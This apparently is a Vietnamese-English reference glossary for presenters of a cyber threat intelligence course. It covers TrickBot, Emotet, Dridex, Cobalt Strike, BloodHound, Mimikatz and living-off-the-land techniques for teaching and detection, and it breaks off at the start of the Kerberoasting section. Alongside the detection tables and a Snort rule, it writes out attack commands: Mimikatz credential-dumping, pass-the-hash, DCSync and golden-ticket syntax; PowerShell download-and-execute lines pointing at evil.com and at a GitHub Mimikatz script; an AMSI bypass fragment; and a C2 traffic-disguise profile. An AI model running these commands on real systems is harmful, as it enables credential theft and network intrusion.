# 📚 CTI Section 4 - Glossary & Technical Reference
## Tài Liệu Tham Khảo Chi Tiết Cho Người Thuyết Trình

> **Mục đích:** File này chứa thông tin kỹ thuật chi tiết về các thuật ngữ, malware, công cụ và kỹ thuật được đề cập trong bài thuyết trình FOR578 Section 4. Sử dụng khi audience đặt câu hỏi sâu hoặc cần giải thích thêm.

---

<a id="muc-luc"></a>

# MỤC LỤC

1. [Malware Families](#1-malware-families)
   - [TrickBot](#trickbot)
   - [Emotet](#emotet)
   - [Dridex](#dridex)
2. [Red Team / Attack Tools](#2-red-team--attack-tools)
   - [Cobalt Strike](#cobalt-strike)
   - [BloodHound](#bloodhound)
   - [Mimikatz](#mimikatz)
3. [Attack Techniques](#3-attack-techniques)
   - [Living-Off-the-Land (LOTL)](#living-off-the-land-lotl)
   - [Process Hollowing](#process-hollowing)
   - [Kerberoasting](#kerberoasting)
4. [Ransomware Operations](#4-ransomware-operations)
   - [Ryuk](#ryuk)
   - [DoppelPaymer](#doppelpaymer)
   - [Conti](#conti)
5. [Threat Actor Groups](#5-threat-actor-groups)
6. [Quick Reference Tables](#6-quick-reference-tables)
7. [Detection Cheat Sheets](#7-detection-cheat-sheets)

---

# 1. MALWARE FAMILIES

---

## TrickBot

### Tổng Quan
| Thuộc tính | Giá trị |
|------------|---------|
| **Tên khác** | TrickLoader, Trickster |
| **Loại** | Banking Trojan → Modular Malware Framework |
| **Xuất hiện** | 2016 |
| **Nguồn gốc** | Evolved từ Dyre (offline 2015) |
| **Threat Actor** | Wizard Spider (Nga) |
| **Ransomware liên quan** | Ryuk, Conti |

### Lịch Sử Phát Triển
```
2015: Dyre banking trojan bị shutdown
  ↓
2016: TrickBot xuất hiện (reuse Dyre code)
  ↓
2017: Thêm SMB worm module
  ↓
2018: Trở thành loader cho Ryuk ransomware
  ↓
2020: Partial takedown bởi Microsoft
  ↓
2021-2024: Vẫn active qua revamped botnets
```

### Kiến Trúc Module

| Module | Chức năng | MITRE ATT&CK |
|--------|-----------|--------------|
| **SystemInfo** | Thu thập OS, hardware, network info | T1082 |
| **NetworkDll** | C2 communication, lateral movement | T1071, T1021 |
| **InjectDll** | Web inject cho banking fraud | T1185 |
| **ImportDll** | Browser data theft (cookies, config) | T1539 |
| **Pwgrab** | Credentials từ browsers, VNC, RDP, PuTTY, OpenSSH, OpenVPN | T1555, T1552 |
| **ShareDll** | SMB-based lateral movement | T1021.002 |
| **tvncDll** | VNC remote access | T1021.005 |
| **spreader_x86.dll** | Worm propagation qua network | T1210 |
| **screenLocker** | Screen locking (ransomware-like) | T1486 |
| **AnchorBot** | Advanced C2 cho high-value targets | T1071 |
| **memoryScraper** | POS data scraping | T1005 |

### Infection Chain Chi Tiết

```
┌─────────────────────────────────────────────────────────┐
│ PHASE 1: Initial Access                                 │
├─────────────────────────────────────────────────────────┤
│ • Spearphishing email với Word/Excel attachment         │
│ • Traffic infringement phishing scheme                  │
│ • Emotet as dropper                                     │
│ • Malvertising campaigns                                │
└────────────────────────┬────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────┐
│ PHASE 2: Execution                                      │
├─────────────────────────────────────────────────────────┤
│ • User enables macros                                   │
│ • Macro drops .cmd script file                          │
│ • cmd.exe executes script                               │
│ • Download TrickBot DLL từ remote server                │
│   Pattern: /bdfh/ hoặc /bmdff/ trong GET request        │
└────────────────────────┬────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────┐
│ PHASE 3: Persistence & Evasion                          │
├─────────────────────────────────────────────────────────┤
│ • regsvr32.exe loads DLL (disguised as .jpg)            │
│ • Process Hollowing vào wermgr.exe                      │
│ • UAC Bypass via Fodhelper.exe                          │
│ • Disable Windows Defender                              │
│ • Scheduled tasks cho persistence                       │
│ • Registry modifications                                │
└────────────────────────┬────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────┐
│ PHASE 4: C2 & Lateral Movement                          │
├─────────────────────────────────────────────────────────┤
│ • C2 với unique bot key (encrypted)                     │
│ • Load modules theo configuration                       │
│ • Credential harvesting                                 │
│ • SMB propagation trong network                         │
│ • Active Directory enumeration                          │
└────────────────────────┬────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────┐
│ PHASE 5: Ransomware Deployment                          │
├─────────────────────────────────────────────────────────┤
│ • Deploy Cobalt Strike beacon                           │
│ • Compromise Domain Controller                          │
│ • Deploy Ryuk/Conti ransomware                          │
│ • Timeline: có thể hoàn thành trong ~5 giờ              │
└─────────────────────────────────────────────────────────┘
```

### C2 Communication

**Request Format:**
```
GET /[gtag]/[BOT_KEY]/[CMD]/[OS_INFO]/[BUILD]/[IP]/[DATA]/ HTTP/1.1
```

**Ví dụ thực tế:**
```
GET /zev4/56dLzNyzsmBH06b_W10010240.42DF9F315753F31B13F17F5E731B7787/0/Windows 10 x64/1108/XX.XX.XX.XX/38245433F0E3D5689F6EE84483106F4382CC92EAFAD51206571D97A519A2EF29/0bqjxzSOQUSLPRJMQSWKDHTHKEG/ HTTP/1.1
```

**Giải thích:**
- `zev4`: gtag (campaign identifier)
- `56dLzNyz...`: Bot key (unique per infection)
- `0`: Command code
- `Windows 10 x64`: OS info
- `1108`: Build number

**Exfiltration (Command 90):**
```
POST /zev4/[BOT_KEY]/90/ HTTP/1.1
```

### UAC Bypass Techniques

**Technique 1: Fodhelper.exe**
```
Registry: HKCU:\Software\Classes\ms-settings\shell\open\command
→ TrickBot writes malicious command
→ Fodhelper.exe executes với elevated privileges
```

**Technique 2: CMSTPLUA COM Object**
- Abuse trusted COM object
- Không trigger UAC prompt

### Detection Indicators

| Indicator Type | Value |
|----------------|-------|
| **Process** | wermgr.exe với unusual behavior |
| **Registry** | Startup entries trong HKCU\...\Run |
| **Network** | C2 pattern với gtag identifiers |
| **File** | DLLs trong %APPDATA%\...\Roaming |
| **Scheduled Task** | Random names, system directories |

### MITRE ATT&CK Mapping

| Tactic | Techniques |
|--------|------------|
| Initial Access | T1566.001, T1566.002 |
| Execution | T1059.001, T1059.007, T1204 |
| Persistence | T1053.005, T1547.001 |
| Privilege Escalation | T1548.002 |
| Defense Evasion | T1055.012, T1562.001 |
| Credential Access | T1555, T1552, T1185 |
| Discovery | T1082, T1083 |
| Lateral Movement | T1021.002, T1210 |
| Collection | T1005, T1185 |
| C2 | T1071.001, T1573 |
| Exfiltration | T1041 |

### FAQ - Câu Hỏi Thường Gặp

**Q: TrickBot khác gì Emotet?**
> A: Emotet là "delivery mechanism" - initial access và spreading. TrickBot là "brains" - thực hiện reconnaissance, credential theft, và chuẩn bị môi trường cho ransomware. Thường thấy Emotet → TrickBot → Ryuk chain.

**Q: TrickBot còn active trong 2024-2025 không?**
> A: Có. Mặc dù bị partial takedown năm 2020, TrickBot vẫn hoạt động qua revamped infrastructure. Theo Huntress 2025 Report, chiếm 6.7% remote access methods.

**Q: Làm sao phân biệt TrickBot campaign?**
> A: Dùng gtag trong C2 requests. Mỗi campaign/affiliate có gtag riêng (ví dụ: zev4, mor14, lib123).


[↑ Quay lại mục lục](#muc-luc)

---

## Emotet

### Tổng Quan
| Thuộc tính | Giá trị |
|------------|---------|
| **Tên khác** | Heodo, Geodo |
| **Loại** | Banking Trojan → Loader/Dropper → MaaS |
| **Xuất hiện** | 2014 |
| **Nguồn gốc** | Đức/Áo (targets ban đầu) |
| **Threat Actor** | Mealybug (Ukraine) |
| **Payloads** | TrickBot, QakBot, IcedID, Ryuk, Conti |

### Timeline Lịch Sử

| Năm | Sự kiện |
|-----|---------|
| 2014 | Banking trojan đầu tiên tại Đức/Áo |
| 2016-2017 | Chuyển sang "loader" model |
| 2018 | Thêm Outlook harvesting module |
| 2019 | 3 Epochs (botnets) hoạt động |
| 2020 | COVID-19 themed campaigns, 16K+ CISA alerts |
| Jan 2021 | Takedown bởi Europol/FBI |
| Nov 2021 | Resurface qua TrickBot infrastructure |
| 2022 | LNK files thay macro documents |
| 2023 | Binary padding technique (500MB+) |
| 2024-2025 | Vẫn active, tiếp tục evolve |

### Botnet Architecture (Epochs)

```
┌─────────────────────────────────────────────────┐
│                  EMOTET ECOSYSTEM               │
├─────────────────────────────────────────────────┤
│                                                 │
│   ┌─────────┐  ┌─────────┐  ┌─────────┐        │
│   │ Epoch 1 │  │ Epoch 2 │  │ Epoch 3 │        │
│   └────┬────┘  └────┬────┘  └────┬────┘        │
│        │            │            │              │
│        ▼            ▼            ▼              │
│   ┌─────────────────────────────────────┐      │
│   │     Separate C2 Infrastructure      │      │
│   │     Different encryption keys       │      │
│   │     Independent updates             │      │
│   └─────────────────────────────────────┘      │
│                                                 │
│   ┌─────────┐                                  │
│   │ Epoch 4 │ ← Active từ 2023                 │
│   └─────────┘                                  │
└─────────────────────────────────────────────────┘
```

### Infection Methods Evolution

**2014-2021: Macro Documents**
```
Email → Word/Excel attachment
         ↓
   Enable Macros prompt
         ↓
   VBA code execution
         ↓
   Download Emotet DLL
         ↓
   regsvr32.exe /s execution
```

**2022: LNK Files**
```
Email → Password-protected ZIP
         ↓
   Extract LNK file
         ↓
   LNK runs embedded script
         ↓
   Method 1: CMD findstr → VBS → WScript → regsvr32
   Method 2: PowerShell direct download
```

**2023+: Binary Padding**
```
Email → ZIP attachment
         ↓
   Word document (500MB+ inflated)
         ↓
   Hidden text padding (Moby-Dick excerpts)
         ↓
   Bypass sandbox file size limits
         ↓
   Standard macro execution
```

### Đặc Điểm Kỹ Thuật Quan Trọng

#### 1. Email Thread Hijacking
```
┌─────────────────────────────────────────────────┐
│ LEGITIMATE THREAD                               │
├─────────────────────────────────────────────────┤
│ From: colleague@company.com                     │
│ To: victim@company.com                          │
│ Subject: Re: Q3 Budget Report                   │
│                                                 │
│ "Here's the updated report as discussed..."    │
│                                                 │
│ [Attachment: Report_Final.doc] ← MALICIOUS     │
└─────────────────────────────────────────────────┘

Victim thấy email từ known contact,
trong existing conversation thread
→ High trust, likely to open
```

#### 2. Outlook Harvesting
```python
# Emotet thu thập:
- Contact relationships (ai gửi cho ai)
- Email content và subject lines
- Attachment patterns
- Organizational structure inference

# Sử dụng cho:
- Targeted phishing với context
- Spear-phishing C-level executives
- Social engineering với insider knowledge
```

#### 3. Worm Module
```
┌─────────────────────────────────────────────────┐
│ PROPAGATION METHODS                             │
├─────────────────────────────────────────────────┤
│ 1. Brute-force credentials                      │
│    └→ Common passwords, domain accounts         │
│                                                 │
│ 2. SMB Share spreading                          │
│    └→ Write to network shares                   │
│                                                 │
│ 3. Nearby WiFi networks                         │
│    └→ Scan and attempt connection               │
│    └→ Propagate to WiFi-connected devices       │
└─────────────────────────────────────────────────┘
```

#### 4. Polymorphic Design
- Thay đổi hash mỗi execution
- Updates từ C2 như OS updates
- New packer/crypter thường xuyên
- Bypass signature-based detection

### Persistence Mechanism

```
Registry Key:
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    └→ Random name
    └→ Points to copy trong %TEMP%

DLL Location:
%TEMP%\[random]\[random].dll

Execution:
regsvr32.exe /s [path_to_dll]
```

### Detection Indicators

| Category | Indicators |
|----------|------------|
| **Ports** | 80, 8080, 443, 445 |
| **Processes** | regsvr32.exe, certutil.exe (copy) |
| **Registry** | Run key với random names |
| **Network** | /wp-admin/ patterns trong URLs |
| **Email** | Reply-chain với attachments |
| **Files** | 500MB+ documents (2023+) |

### Snort Rules (CISA)
```
alert tcp any any -> any $HTTP_PORTS (
  msg:"EMOTET:HTTP URI GET contains '/wp-admin/###/'";
  flow:established,to_server;
  content:"/wp-admin/";
  http_uri;
  urilen:<15;
)
```

### FAQ

**Q: Emotet là virus không?**
> A: Không. Emotet là trojan/malware. Virus tự replicate bằng cách infect files khác. Emotet spread qua email campaigns và network propagation.

**Q: Tại sao gọi là "world's most dangerous malware"?**
> A: CISA ghi nhận 16,000+ alerts trong federal networks (2020). Emotet là gateway cho nhiều ransomware operations. Infrastructure scale rất lớn (millions of emails/day).

**Q: Làm sao nhận biết Emotet email?**
> A: 
> - Reply trong existing thread (thread hijacking)
> - Invoice/shipping/legal themes
> - Password-protected ZIP attachments
> - Macro-enabled documents
> - Known sender but unusual request


[↑ Quay lại mục lục](#muc-luc)

---

## Dridex

### Tổng Quan
| Thuộc tính | Giá trị |
|------------|---------|
| **Tên khác** | Bugat, Cridex |
| **Loại** | Banking Trojan + Botnet + Infostealer |
| **Xuất hiện** | 2012 (evolved từ Cridex) |
| **Threat Actor** | Evil Corp / INDRIK SPIDER |
| **Ransomware liên quan** | BitPaymer, DoppelPaymer, WastedLocker |

### Tầm Quan Trọng Cho CTI

> ⚠️ **Key Intelligence Point:**
> 
> Nếu phát hiện **Dridex** trong môi trường:
> - Đang đối mặt với **Evil Corp** (không phải Wizard Spider)
> - Ransomware có thể là **DoppelPaymer/BitPaymer** (không phải Ryuk)
> - **Investigation strategy khác** với TrickBot incidents
> - Post-2019: Evil Corp có thể dùng **LockBit** để tránh sanctions

### Evil Corp Timeline

```
┌─────────────────────────────────────────────────────────┐
│ EVIL CORP EVOLUTION                                     │
├─────────────────────────────────────────────────────────┤
│                                                         │
│ 2012-2019: Dridex + BitPaymer era                       │
│     └→ Peak activity, massive spam campaigns            │
│     └→ Millions of messages per day                     │
│                                                         │
│ Dec 2019: US Treasury sanctions + FBI indictment        │
│     └→ Maksim Yakubets (leader) - $5M reward            │
│     └→ Igor Turashev - charged                          │
│                                                         │
│ 2020-2021: Pivot to new ransomware                      │
│     └→ WastedLocker                                     │
│     └→ Hades                                            │
│     └→ Abandon Dridex to evade detection                │
│                                                         │
│ 2022+: Affiliate model                                  │
│     └→ SocGholish for initial access                    │
│     └→ LockBit affiliate (disguise identity)            │
│     └→ Aleksandr Ryzhenkov identified as LockBit user   │
│                                                         │
│ Feb 2024: LockBit disrupted (Operation Cronos)          │
└─────────────────────────────────────────────────────────┘
```

### P2P Architecture

```
┌─────────────────────────────────────────────────────────┐
│ DRIDEX P2P NETWORK                                      │
├─────────────────────────────────────────────────────────┤
│                                                         │
│   ┌────────┐    ┌────────┐    ┌────────┐               │
│   │ Bot A  │◄──►│ Bot B  │◄──►│ Bot C  │               │
│   └────┬───┘    └────┬───┘    └────┬───┘               │
│        │             │             │                    │
│        ▼             ▼             ▼                    │
│   ┌────────────────────────────────────┐               │
│   │     Distributed C2 Network         │               │
│   │     (No single point of failure)   │               │
│   └────────────────────────────────────┘               │
│                                                         │
│ Advantages:                                             │
│ • Resilient to takedowns                                │
│ • C2 IPs rotate frequently                              │
│ • Difficult to track centrally                          │
└─────────────────────────────────────────────────────────┘
```

### Capabilities

| Capability | Description | Technique |
|------------|-------------|-----------|
| **Web Injects** | Modify banking pages in browser | Man-in-the-Browser |
| **Form Grabbing** | Capture form submissions | Credential Harvesting |
| **Keylogging** | Record keystrokes | Input Capture |
| **Screenshots** | Capture screen content | Screen Capture |
| **VNC Module** | Remote desktop access | Remote Access |
| **Email Theft** | Steal Outlook credentials | Credential Access |
| **Network Recon** | Map internal network | Discovery |

### Infection Chain

```
┌─────────────────────────────────────────────────────────┐
│ DRIDEX INFECTION CHAIN                                  │
├─────────────────────────────────────────────────────────┤
│                                                         │
│ ① Email Delivery                                        │
│    └→ Invoice/shipping themed phishing                  │
│    └→ Word/Excel attachment                             │
│    └→ Subject: "Your Booking 12345678"                  │
│    └→ Attachment: "Direct-Documentation.zip"            │
│                                                         │
│ ② Document Execution                                    │
│    └→ User enables macros                               │
│    └→ VBA macro executes                                │
│    └→ May use intermediate loader (Quant Loader)        │
│                                                         │
│ ③ Dridex Installation                                   │
│    └→ Download DLL payload                              │
│    └→ DLL search order hijacking                        │
│    └→ Inject into legitimate process                    │
│                                                         │
│ ④ P2P C2 Establishment                                  │
│    └→ Connect to peer network                           │
│    └→ Encrypted tunnel for commands                     │
│    └→ Receive configuration updates                     │
│                                                         │
│ ⑤ Credential Harvesting                                 │
│    └→ Web injects for banking sites                     │
│    └→ Keylogging active                                 │
│    └→ Form grabbing enabled                             │
│                                                         │
│ ⑥ Optional: Ransomware                                  │
│    └→ BitPaymer deployment (pre-2019)                   │
│    └→ DoppelPaymer deployment                           │
│    └→ WastedLocker/Hades (post-sanctions)               │
└─────────────────────────────────────────────────────────┘
```

### Code Relationship với BitPaymer

| Similarity | Description |
|------------|-------------|
| Same functions | Multiple shared mechanics |
| Compile time | Compiled at nearly same time |
| String handling | Same string encryption |
| Anti-analysis | Similar evasion techniques |
| → Conclusion | Same developers (Evil Corp) |

### Detection

| Indicator | Details |
|-----------|---------|
| **Excel 4.0 macros** | XLM macros trong spreadsheets |
| **DLL hijacking** | Search order hijacking của Windows binaries |
| **regsvr32.exe** | Spawned by Excel processes |
| **Scheduled tasks** | Persistence trong system directories |
| **Botnet IDs** | Campaign tracking (e.g., 7200, 7500) |

### Dridex vs TrickBot - So Sánh

| Aspect | Dridex | TrickBot |
|--------|--------|----------|
| **Threat Actor** | Evil Corp | Wizard Spider |
| **Origin** | Russia | Russia |
| **Ransomware** | BitPaymer, DoppelPaymer | Ryuk, Conti |
| **C2 Architecture** | P2P distributed | Centralized with backups |
| **Current Status** | Declined (sanctions) | Still active |
| **Investigation** | Different playbook | Different playbook |


[↑ Quay lại mục lục](#muc-luc)

---

# 2. RED TEAM / ATTACK TOOLS

---

## Cobalt Strike

### Tổng Quan
| Thuộc tính | Giá trị |
|------------|---------|
| **Loại** | Commercial Adversary Simulation Tool |
| **Tạo bởi** | Raphael Mudge (2012) |
| **Thuộc** | Fortra (formerly HelpSystems) |
| **Giá** | ~$3,500/user/năm |
| **Dual-use** | Red Team tool + Abused by threat actors |

### Thống Kê Abuse

| Metric | Value |
|--------|-------|
| APT groups sử dụng | 30+ (theo MITRE ATT&CK) |
| Healthcare ransomware attacks (2024) | 68+ dùng Cobalt Strike |
| Time to ransomware | **17 phút** trung bình |

### Kiến Trúc

```
┌─────────────────────────────────────────────────────────┐
│                 COBALT STRIKE ARCHITECTURE              │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ATTACKER SIDE                    TARGET ENVIRONMENT    │
│  ────────────                     ──────────────────    │
│                                                         │
│  ┌──────────┐                     ┌──────────────┐      │
│  │  Client  │                     │   Beacon 1   │      │
│  │   GUI    │                     │  (Victim PC) │      │
│  └────┬─────┘                     └───────┬──────┘      │
│       │                                   │             │
│       ▼                                   │             │
│  ┌──────────────┐     C2 Channel          │             │
│  │ Team Server  │◄────────────────────────┤             │
│  │   (Linux)    │                         │             │
│  │              │◄────────────────────────┤             │
│  └──────────────┘                         │             │
│                                   ┌───────┴──────┐      │
│  Requirements:                    │   Beacon 2   │      │
│  • Ubuntu/Kali/Debian             │  (Server)    │      │
│  • Oracle Java 11+                └──────────────┘      │
│  • Port 50050 (default)                                 │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### Beacon Capabilities

| Category | Capabilities |
|----------|--------------|
| **Execution** | Command execution, PowerShell, .NET assemblies |
| **Credential** | Mimikatz integration, Kerberos tickets, hashdump |
| **Recon** | Port scan, network enumeration, process list |
| **Lateral** | PsExec, WMI, WinRM, SSH, pass-the-hash |
| **Persistence** | Service, registry, scheduled task |
| **Evasion** | Process injection, sleep/jitter, AMSI bypass |
| **Pivoting** | SOCKS proxy, port forwarding, VPN |
| **Exfil** | File download/upload, clipboard |

### Communication Channels

| Protocol | Description | Use Case |
|----------|-------------|----------|
| **HTTP/HTTPS** | Malleable C2 profiles | Primary, blend with web traffic |
| **DNS** | DNS tunneling | Bypass firewall, slow but stealthy |
| **SMB** | Named pipes | Internal lateral, peer-to-peer |
| **TCP** | Direct connection | Fast, less stealthy |

### Malleable C2 Profiles

```
# Example: Giả dạng Amazon traffic
http-get {
    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
    
    client {
        header "Host" "www.amazon.com";
        header "Accept" "*/*";
        metadata {
            base64url;
            prepend "session-token=";
            header "Cookie";
        }
    }
}
```

### Detection Strategies

| Method | Indicator |
|--------|-----------|
| **Memory** | 0xBEEF magic number trong metadata |
| **Network** | Default port 50050, JARM hash |
| **Certificate** | Default TLS certificate patterns |
| **Process** | Service với random names, injected processes |
| **Shodan/Censys** | Scan for Team Servers |

### Distinguishing Legitimate vs Malicious

| Factor | Legitimate | Malicious |
|--------|------------|-----------|
| **License** | Paid ($3,500/yr) | Cracked version |
| **Notification** | SOC informed | No notification |
| **Testing window** | Scheduled | Any time |
| **Watermark** | Unique per license | Shared/modified |


[↑ Quay lại mục lục](#muc-luc)

---

## BloodHound

### Tổng Quan
| Thuộc tính | Giá trị |
|------------|---------|
| **Loại** | Active Directory Reconnaissance Tool |
| **Developers** | SpecterOps (@_wald0, @CptJesus, @harmj0y) |
| **License** | Apache 2.0 (open source) |
| **Backend** | Neo4j graph database |
| **Dual-use** | Red team + Blue team defense |

### Versions

| Version | Description |
|---------|-------------|
| **BloodHound CE** | Free, open-source, web-based |
| **BloodHound Enterprise** | SaaS, Attack Path Management |
| **Legacy** | Electron desktop app (being archived) |

### Architecture

```
┌─────────────────────────────────────────────────────────┐
│                 BLOODHOUND WORKFLOW                     │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ① COLLECTION                                           │
│  ┌─────────────────────────────────────────────────┐   │
│  │ SharpHound.exe / Invoke-BloodHound              │   │
│  │ • Run from domain-joined system                 │   │
│  │ • Only needs domain user privileges             │   │
│  │ • Collects via LDAP, SMB, RPC                   │   │
│  └─────────────────────────────────────────────────┘   │
│                           │                             │
│                           ▼                             │
│  ② DATA (JSON files)                                    │
│  ┌─────────────────────────────────────────────────┐   │
│  │ users.json, groups.json, computers.json         │   │
│  │ domains.json, sessions.json, gpos.json          │   │
│  └─────────────────────────────────────────────────┘   │
│                           │                             │
│                           ▼                             │
│  ③ IMPORT                                               │
│  ┌─────────────────────────────────────────────────┐   │
│  │ Neo4j Database                                  │   │
│  │ • Graph relationships                           │   │
│  │ • Cypher query language                         │   │
│  └─────────────────────────────────────────────────┘   │
│                           │                             │
│                           ▼                             │
│  ④ ANALYSIS                                             │
│  ┌─────────────────────────────────────────────────┐   │
│  │ BloodHound GUI                                  │   │
│  │ • Pre-built queries                             │   │
│  │ • Custom Cypher queries                         │   │
│  │ • Visual attack path graphs                     │   │
│  └─────────────────────────────────────────────────┘   │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### SharpHound Collection Methods

```bash
# Collect everything
SharpHound.exe -c All

# Specific collections
SharpHound.exe -c DCOnly        # Domain Controllers only
SharpHound.exe -c Session       # Active sessions
SharpHound.exe -c LoggedOn      # Logged on users
SharpHound.exe -c Trusts        # Domain trusts
SharpHound.exe -c ACL           # Access Control Lists

# PowerShell version
Invoke-BloodHound -CollectionMethod All
```

### Pre-Built Queries

| Query | Purpose |
|-------|---------|
| Find All Domain Admins | List DA accounts |
| Shortest Path to Domain Admin | Attack path visualization |
| Find Kerberoastable Accounts | SPN-based attack targets |
| Find AS-REP Roastable Users | Pre-auth disabled accounts |
| Shortest Path from Owned | Path từ compromised accounts |
| Find Computers with Unsupported OS | Legacy system identification |

### Attack Paths Revealed

| Edge Type | Meaning | Exploitation |
|-----------|---------|--------------|
| **MemberOf** | Group membership | Inherit permissions |
| **AdminTo** | Local admin | Full control of computer |
| **HasSession** | User session on computer | Credential theft |
| **CanRDP** | RDP access | Remote access |
| **GenericAll** | Full control over object | Reset password, add to group |
| **GenericWrite** | Write properties | Modify attributes |
| **ForceChangePassword** | Can reset password | Account takeover |
| **AddMember** | Can add to group | Add self to DA |
| **DCSync** | Replication rights | Dump all hashes |

### Detection

| Indicator | Details |
|-----------|---------|
| **SMB scanning** | Ports 137, 445 |
| **Named pipes** | Multiple connections |
| **LDAP queries** | Unusual enumeration patterns |
| **Process** | SharpHound.exe execution |


[↑ Quay lại mục lục](#muc-luc)

---

## Mimikatz

### Tổng Quan
| Thuộc tính | Giá trị |
|------------|---------|
| **Loại** | Credential Extraction Tool |
| **Developer** | Benjamin Delpy (@gentilkiwi) |
| **Language** | C |
| **Purpose** | Demonstrate Windows credential vulnerabilities |

### Core Modules

| Module | Command | Description |
|--------|---------|-------------|
| **sekurlsa** | `sekurlsa::logonpasswords` | Dump credentials từ LSASS |
| **lsadump** | `lsadump::dcsync` | DCSync attack (replication) |
| **kerberos** | `kerberos::golden` | Create Golden Tickets |
| **crypto** | `crypto::certificates` | Export certificates |
| **vault** | `vault::cred` | Windows Vault credentials |

### Common Attacks

```
# Dump logon passwords
sekurlsa::logonpasswords

# Pass-the-Hash
sekurlsa::pth /user:admin /domain:corp /ntlm:HASH

# DCSync (requires replication rights)
lsadump::dcsync /domain:corp.local /user:krbtgt

# Golden Ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH

# Over-Pass-the-Hash
sekurlsa::pth /user:admin /domain:corp /aes256:KEY
```

### Invoke-Mimikatz (PowerShell)
```powershell
# Load in memory
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')

# Execute
Invoke-Mimikatz -DumpCreds
```


[↑ Quay lại mục lục](#muc-luc)

---

# 3. ATTACK TECHNIQUES

---

## Living-Off-the-Land (LOTL)

### Định Nghĩa
Kỹ thuật tấn công sử dụng legitimate system tools đã có sẵn trong hệ thống, không cần deploy custom malware. Còn gọi là LOLBins (Living Off the Land Binaries).

### Thống Kê (2024)

| Metric | Value |
|--------|-------|
| High-severity attacks using LOTL | 84% |
| LOTL cases involving PowerShell | 71% |
| Critical incidents (fileless) | 86.2% |
| LOLBins documented (LOLBAS) | 200+ |

### Tại Sao Hiệu Quả

```
┌─────────────────────────────────────────────────────────┐
│ WHY LOTL WORKS                                          │
├─────────────────────────────────────────────────────────┤
│                                                         │
│ ✓ Tools trong "allow list"                              │
│   └→ Không bị block bởi application whitelisting        │
│                                                         │
│ ✓ Signed bởi Microsoft                                  │
│   └→ Trusted by default                                 │
│                                                         │
│ ✓ Không tạo traditional IOCs                            │
│   └→ No malware files to detect                         │
│                                                         │
│ ✓ Blend với normal activity                             │
│   └→ Admins use same tools daily                        │
│                                                         │
│ ✓ Khó attribute attacks                                 │
│   └→ No custom tooling fingerprints                     │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### Top LOLBins

| Binary | Legitimate Use | Abuse Case |
|--------|----------------|------------|
| **PowerShell.exe** | Automation, scripting | C2, lateral movement, download |
| **cmd.exe** | Command execution | Script execution |
| **wmic.exe** | WMI queries | Remote execution, recon |
| **mshta.exe** | HTML applications | Execute HTA payloads |
| **rundll32.exe** | Run DLL functions | Load malicious DLLs |
| **regsvr32.exe** | Register DLLs | Execute scriptlets |
| **certutil.exe** | Certificate management | Download files, encode |
| **bitsadmin.exe** | Background transfers | Stealthy file download |
| **schtasks.exe** | Scheduled tasks | Persistence |
| **msiexec.exe** | Install MSI packages | Execute malicious MSI |

### PowerShell Attack Patterns

```powershell
# ⚠️ Red Flags - Common attack patterns

# 1. Encoded commands (Base64)
powershell -enc [BASE64_STRING]
powershell -e [BASE64_STRING]
powershell -EncodedCommand [BASE64_STRING]

# 2. Download and execute
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
IEX (iwr 'http://evil.com/payload.ps1')

# 3. Execution policy bypass
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -file script.ps1

# 4. Hidden window
powershell -WindowStyle Hidden -Command "..."

# 5. No profile
powershell -NoProfile -Command "..."

# 6. AMSI bypass attempts
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

### LOLBAS Project
URL: https://lolbas-project.github.io

Structure:
```
Each binary entry includes:
├── Name
├── Description
├── Author
├── Created date
├── Commands (attack techniques)
│   ├── Command syntax
│   ├── Description
│   ├── Usecase
│   ├── Category (Execute, Download, etc.)
│   ├── Privileges required
│   ├── MITRE ATT&CK technique
│   └── Operating systems
├── Full path
├── Detection
└── Resources/References
```

### Detection Strategies

| Strategy | Description |
|----------|-------------|
| **Behavioral Analytics** | 62% better than signature-based |
| **PowerShell Logging** | ScriptBlock, Module, Transcription |
| **Command-line Auditing** | Log process creation with args |
| **Baseline** | Know normal to detect anomalies |
| **IOA over IOC** | Focus on behavior, not indicators |


[↑ Quay lại mục lục](#muc-luc)

---

## Process Hollowing

### Định Nghĩa
Technique để inject malicious code vào legitimate process bằng cách:
1. Tạo suspended process
2. Unmap legitimate code
3. Map malicious code vào cùng space
4. Resume execution

### Flow

```
┌─────────────────────────────────────────────────────────┐
│ PROCESS HOLLOWING STEPS                                 │
├─────────────────────────────────────────────────────────┤
│                                                         │
│ ① CreateProcess với CREATE_SUSPENDED flag               │
│    └→ Legitimate process (e.g., svchost.exe)            │
│    └→ Process created but not executing                 │
│                                                         │
│ ② NtUnmapViewOfSection                                  │
│    └→ Remove legitimate code từ memory                  │
│                                                         │
│ ③ VirtualAllocEx                                        │
│    └→ Allocate memory cho malicious code                │
│                                                         │
│ ④ WriteProcessMemory                                    │
│    └→ Write malicious payload                           │
│                                                         │
│ ⑤ SetThreadContext                                      │
│    └→ Point entry to malicious code                     │
│                                                         │
│ ⑥ ResumeThread                                          │
│    └→ Process executes malicious code                   │
│    └→ Appears as legitimate process                     │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### Common Targets
- svchost.exe
- explorer.exe  
- wermgr.exe (TrickBot favorite)
- notepad.exe

### Detection
- Memory không match disk image
- Unusual parent-child relationships
- Network activity từ unexpected processes


[↑ Quay lại mục lục](#muc-luc)

---

## Kerberoasting

### Định Nghĩa
Technique để extract service account password hashes từ Active Directory bằng cách request Kerberos service tickets, sau đó offline crack.

### Prerequisites
- Domain user account (any)
- Service accounts với SPNs configured

### Attack Flow

```
┌─────────────────────────────────────────────────────────┐
│ KERBEROASTING ATTACK                                    │
├─────────────────────────────────────────────────────────┤
